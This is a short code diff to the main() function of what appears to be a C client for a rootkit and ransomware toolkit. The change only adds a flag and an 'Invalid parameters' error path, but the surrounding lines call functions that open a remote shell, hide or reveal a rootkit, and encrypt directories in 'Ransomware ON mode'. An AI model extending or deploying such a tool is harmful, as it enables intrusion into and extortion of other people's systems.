@@ -205,6 +205,8 @@ void main(int argc, char* argv[]){
     int ENCRYPT_MODE_SEL = 0;
     int DECRYPT_MODE_SEL = 0;
     int PATH_ARG_PROVIDED = 0;
+
+    int PARAM_MODULE_ACTIVATED = 0;
     
     int opt;
     char dest_address[32];
@@ -221,6 +223,7 @@ void main(int argc, char* argv[]){
             //printf("Option S has argument %s\n", optarg);
             strcpy(dest_address, optarg);
             get_shell(dest_address);
+            PARAM_MODULE_ACTIVATED = 1;
             
             break;
         case 'u': 
@@ -231,6 +234,7 @@ void main(int argc, char* argv[]){
             //printf("Option m has argument %s\n", optarg);
             strcpy(dest_address, optarg);
             show_rootkit(dest_address);
+            PARAM_MODULE_ACTIVATED = 1;
 
             break;
         case 'i': 
@@ -241,6 +245,7 @@ void main(int argc, char* argv[]){
             //printf("Option m has argument %s\n", optarg);
             strcpy(dest_address, optarg);
             hide_rootkit(dest_address);
+            PARAM_MODULE_ACTIVATED = 1;
         
         case 'e': 
             ENCRYPT_MODE_SEL = 1;
@@ -288,8 +293,9 @@ void main(int argc, char* argv[]){
         //Selecting encrypt directory - Ransomware ON mode
         printf("["KBLU"INFO"RESET"]""Selected DECRYPT a rootkit remotely\n");
         decrypt_directory(dest_address, path_arg);
-    }else{
-        //print_help_dialog(argv[0]);
+    }else if(PARAM_MODULE_ACTIVATED==0){
+        printf("["KRED"ERROR"RESET"]""Invalid parameters\n");
+        print_help_dialog(argv[0]);
         exit(EXIT_FAILURE);
     }
    
